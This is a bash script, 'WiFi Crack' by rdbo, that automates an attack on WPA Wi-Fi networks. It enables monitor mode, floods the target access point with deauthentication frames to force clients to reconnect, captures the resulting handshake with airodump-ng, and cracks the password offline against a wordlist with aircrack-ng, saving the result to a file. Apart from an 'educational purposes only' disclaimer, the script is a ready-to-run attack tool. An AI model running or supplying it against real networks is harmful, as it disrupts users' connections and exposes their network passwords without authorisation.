#!/bin/bash

#VARIABLES

cmd_aircrack="aircrack-ng"
cmd_airmon="airmon-ng"
str_wc="[*]"
str_error="[!]"
str_input="[i]"
argc=$#
usage="./wifi_crack -b BSSID -e ESSID -i interface -w wordlist -c channel"
min_args=10
max_args=10
user=$(whoami)
COLOR_RED="\033[1;31m"
COLOR_GREEN="\033[1;32m"
COLOR_BLUE="\033[1;34m"
COLOR_YELLOW="\033[1;33m"
COLOR_LIGHT_GRAY="\033[0;37m"
COLOR_NONE="\033[0m"
handshake="handshake"
deauth_frames="50"
path=$(pwd)

BSSID=""
ESSID=""
INTERFACE=""
INTERFACE_MON="wlan0mon"
CHANNEL=""
WORDLIST=""
DELAY="100"
status_interface=0
key="0"

#FUNCTIONS

function wc_print()
{
	string=""
	for a in $@; do
		string="${string}$a "
	done

	echo "$str_wc $string"
}

function wc_print_color()
{
	string=""
	i=0
	for a in $@; do
		i=$(($i+1))
		if [ $i -ne 1 ];then
			string="${string}$a "
		fi
	done

	echo -e "$1$str_wc $string ${COLOR_NONE}"	
}

function wc_print_error()
{
	string=""
	for a in $@; do
		string="${string}$a "
	done

	echo -e "${COLOR_RED}$str_error $string ${COLOR_NONE}"
}

function check_interface()
{
	if grep "up" -q /sys/class/net/$1/operstate &> /dev/null; then
		status_interface=1
	fi
}

function parse_args()
{
	i=0
	wl=0
	b=0
	e=0
	itf=0
	c=0
	for arg in $@; do
		#-------------------
		i=$((i+1))
		if [ $arg = "-w" ]; then
			wl=$(($i+1))
		fi

		if [ $arg = "-e" ]; then
			e=$(($i+1))
		fi

		if [ $arg = "-b" ]; then
			b=$(($i+1))
		fi

		if [ $arg = "-i" ]; then
			itf=$(($i+1))
		fi

		if [ $arg = "-c" ]; then
			c=$(($i+1))
		fi

		#-------------------

		if [ $i = $wl ]; then
			WORDLIST="$arg"
		fi

		if [ $i = $e ]; then
			ESSID="$arg"
		fi

		if [ $i = $b ]; then
			BSSID="$arg"
		fi

		if [ $i = $itf ]; then
			INTERFACE="$arg"
		fi

		if [ $i = $c ]; then
			CHANNEL="$arg"
		fi
	done

	if [ $wl -eq 0 ] || [ $e -eq 0 ] || [ $b -eq 0 ] || [ $itf -eq 0 ] || [ $wl -gt $max_args ] || [ $e -gt $max_args ] || [ $b -gt $max_args ] || [ $itf -gt $max_args ]; then
		wc_print_error "Invalid parameters."
		wc_print_color "${COLOR_LIGHT_GRAY}" "Usage: " $usage
		exit
	fi
}

function clear_file()
{
	printf "" &> $1
}

function set_monitor_mode()
{
	airmon-ng $1 $2 &> /dev/null
}

function run_attack()
{
	rm $handshake* &> /dev/null
	wc_print_color "$COLOR_BLUE" "Deauthenticating users from broadcast..."
	aireplay-ng --deauth $deauth_frames -a $BSSID $INTERFACE_MON --ignore-negative-one &> /dev/null
	wc_print_color "$COLOR_BLUE" "Capturing Handshake..."
	tmux new -d
	#airodump-ng -c $CHANNEL --bssid $BSSID -w $handshake $INTERFACE_MON --ignore-negative-one
	tmux send -Rt 0 airodump-ng SPACE -c SPACE $CHANNEL SPACE --bssid SPACE $BSSID SPACE -w SPACE $handshake SPACE $INTERFACE_MON SPACE --ignore-negative-one ENTER
	sleep $DELAY
	tmux send -Rt 0 C-c
	tmux send -Rt 0 C-d
	wc_print_color "$COLOR_BLUE" "Cracking handshake..."
	printf "\n---------------\n" >> output.txt
	printf "ESSID: $ESSID\n" >> output.txt
	key=$(aircrack-ng -w $WORDLIST -b $BSSID ${handshake}-01.cap)
	echo "AirCrack Output: " >> output.txt
	echo "$key" >> output.txt
	rm $handshake* &> /dev/null
}

#SCRIPT

##INIT
clear
echo -e "${COLOR_GREEN}<< WiFi Crack >>"
echo -e "------------by rdbo ${COLOR_NONE}"
echo -e "${COLOR_YELLOW}Disclaimer: \"This was made for educational purposes only."
echo -e "Make sure you have permission to run this attack"
echo -e "I do NOT own Aircrack\"${COLOR_NONE}"
echo -e "${COLOR_YELLOW}-------------------------------------${COLOR_NONE}"

##Checks
if [ $user != "root" ]; then
	wc_print_error "Make sure your are running as root"
	exit
fi

if [ $argc -eq 0 ] || [ $argc -lt $min_args ]; then
	wc_print_error "Invalid number or arguments."
	wc_print_color "${COLOR_LIGHT_GRAY}" "Usage: " $usage
	exit
fi

parse_args $@

wc_print_color "$COLOR_GREEN" "INPUT"
echo "ESSID:     $ESSID"
echo "BSSID:     $BSSID"
echo "Interface: $INTERFACE"
echo "WordList:  $WORDLIST"
wc_print_color "$COLOR_GREEN" "Checking Interface..."
check_interface $INTERFACE
wc_print_color "$COLOR_GREEN" "Interface Status: $status_interface"
if [ $status_interface -eq 0 ]; then
	wc_print_error "Interface Link Status Invalid"
	exit
fi

if [ ! -f $WORDLIST ]; then
    wc_print_error "Wordlist file not found at: $WORDLIST"
    exit
fi

bkill=""
read -p "${str_input} Kill processes could cause trouble? (Y/N): " bkill
if [ $bkill != "n" ] && [ $bkill != "N" ];then
	airmon-ng check kill &> /dev/null
fi
wc_print_color "$COLOR_BLUE" "Starting Monitor Mode..."
set_monitor_mode start $INTERFACE
wc_print_color "$COLOR_BLUE" "Running Attack..."
run_attack
wc_print_color "$COLOR_BLUE" "Stopping Monitor Mode..."
set_monitor_mode stop $INTERFACE_MON
wc_print_color "$COLOR_GREEN" "Done!"